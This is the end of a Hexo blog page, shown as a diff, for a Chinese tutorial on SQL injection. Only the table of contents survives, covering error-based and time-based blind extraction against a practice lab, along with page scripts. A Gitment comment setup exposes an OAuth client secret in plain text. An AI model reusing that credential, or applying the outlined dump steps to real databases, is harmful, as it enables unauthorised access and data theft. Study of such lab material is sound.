href="#2-1-4-%E7%88%86%E6%95%B0%E6%8D%AE"><span class="toc-nav-number">2.1.5.</span> <span class="toc-nav-text">2.1.4.爆数据</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#2-2-EXP-%E6%8A%A5%E9%94%99"><span class="toc-nav-number">2.2.</span> <span class="toc-nav-text">2.2.EXP()报错</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2-2-1-%E7%88%86%E5%BA%93"><span class="toc-nav-number">2.2.1.</span> <span class="toc-nav-text">2.2.1.爆库</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2-2-2-%E7%88%86%E8%A1%A8"><span class="toc-nav-number">2.2.2.</span> <span class="toc-nav-text">2.2.2.爆表</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2-2-3-%E7%88%86%E5%AD%97%E6%AE%B5"><span class="toc-nav-number">2.2.3.</span> <span class="toc-nav-text">2.2.3.爆字段</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2-2-4-%E7%88%86%E6%95%B0%E6%8D%AE"><span class="toc-nav-number">2.2.4.</span> <span class="toc-nav-text">2.2.4.爆数据</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2-2-5-%E7%88%86%E4%B8%A4%E5%88%97%E6%95%B0%E6%8D%AE"><span class="toc-nav-number">2.2.5.</span> <span class="toc-nav-text">2.2.5.爆两列数据</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#2-3-bigint%E6%BA%A2%E5%87%BA"><span class="toc-nav-number">2.3.</span> <span class="toc-nav-text">2.3.bigint溢出</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2-3-1-%E7%88%86%E5%BA%93"><span class="toc-nav-number">2.3.1.</span> <span class="toc-nav-text">2.3.1.爆库</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2-3-2-%E7%88%86%E8%A1%A8"><span class="toc-nav-number">2.3.2.</span> <span class="toc-nav-text">2.3.2.爆表</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2-3-3-%E7%88%86%E5%AD%97%E6%AE%B5"><span class="toc-nav-number">2.3.3.</span> <span class="toc-nav-text">2.3.3.爆字段</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2-3-4-%E7%88%86%E6%95%B0%E6%8D%AE"><span class="toc-nav-number">2.3.4.</span> <span class="toc-nav-text">2.3.4.爆数据</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#2-4-Xpath%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-nav-number">2.4.</span> <span class="toc-nav-text">2.4.Xpath报错注入</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2-4-1-Xpath%E6%B3%A8%E5%85%A5%E4%B9%8Bextractvalue"><span class="toc-nav-number">2.4.1.</span> <span class="toc-nav-text">2.4.1.Xpath注入之extractvalue()</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#2-4-1-1-%E7%88%86%E5%BA%93"><span class="toc-nav-number">2.4.1.1.</span> <span class="toc-nav-text">2.4.1.1.爆库</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#2-4-1-2-%E7%88%86%E8%A1%A8"><span class="toc-nav-number">2.4.1.2.</span> <span class="toc-nav-text">2.4.1.2.爆表</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#2-4-1-3-%E7%88%86%E5%AD%97%E6%AE%B5"><span class="toc-nav-number">2.4.1.3.</span> <span class="toc-nav-text">2.4.1.3.爆字段</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#2-4-1-6-%E7%88%86%E6%95%B0%E6%8D%AE"><span class="toc-nav-number">2.4.1.4.</span> <span class="toc-nav-text">2.4.1.6.爆数据</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2-4-2-Xpath%E6%B3%A8%E5%85%A5%E4%B9%8Bupdatexml"><span class="toc-nav-number">2.4.2.</span> <span class="toc-nav-text">2.4.2.Xpath注入之updatexml()</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#2-4-2-1-%E7%88%86%E5%BA%93"><span class="toc-nav-number">2.4.2.1.</span> <span class="toc-nav-text">2.4.2.1.爆库</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#2-4-2-3-%E7%88%86%E8%A1%A8"><span class="toc-nav-number">2.4.2.2.</span> <span class="toc-nav-text">2.4.2.3.爆表</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#2-4-2-4-%E7%88%86%E5%AD%97%E6%AE%B5"><span class="toc-nav-number">2.4.2.3.</span> <span class="toc-nav-text">2.4.2.4.爆字段</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#2-4-2-5-%E7%88%86%E6%95%B0%E6%8D%AE"><span class="toc-nav-number">2.4.2.4.</span> <span class="toc-nav-text">2.4.2.5.爆数据</span></a></li></ol></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#%E4%B8%89%E3%80%81%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">三、时间盲注</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#3-1-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E5%AE%9E%E6%88%98"><span class="toc-nav-number">3.1.</span> <span class="toc-nav-text">3.1.时间盲注实战</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#3-1-1-%E8%AE%BF%E9%97%AELess-10"><span class="toc-nav-number">3.1.1.</span> <span class="toc-nav-text">3.1.1.访问Less-10</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#3-1-2-%E5%B0%9D%E8%AF%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5"><span class="toc-nav-number">3.1.1.1.</span> <span class="toc-nav-text">3.1.2.尝试双引号测试注入</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#3-1-3-%E7%88%86%E5%BA%93"><span class="toc-nav-number">3.1.1.2.</span> <span class="toc-nav-text">3.1.3.爆库</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#3-1-5-%E7%88%86%E8%A1%A8"><span class="toc-nav-number">3.1.1.3.</span> <span class="toc-nav-text">3.1.5.爆表</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#3-1-6-%E7%88%86%E5%AD%97%E6%AE%B5"><span class="toc-nav-number">3.1.1.4.</span> <span class="toc-nav-text">3.1.6.爆字段</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#3-1-7-%E7%88%86%E6%95%B0%E6%8D%AE"><span class="toc-nav-number">3.1.1.5.</span> <span class="toc-nav-text">3.1.7.爆数据</span></a></li></ol></li></ol></li></ol></li></ol>
+    
+  </div>
+</aside>
+
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/2019/03/06/SQL注入全解/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+  <script>
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+  </script>
+
+
+
+  <script>
+    var gitmentConfig = "si1ent";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "SQL注入全解",
+        owner: "si1ent",
+        repo: "",
+        oauth: {
+          client_id: "0f87e490e00ee3fd87ef",
+          client_secret: "4a9d2b148e7971c2201ad12131ce8bf8159ccd2e"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    </p>
+    <p class="copyright">
+    皖ICP备19004273
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
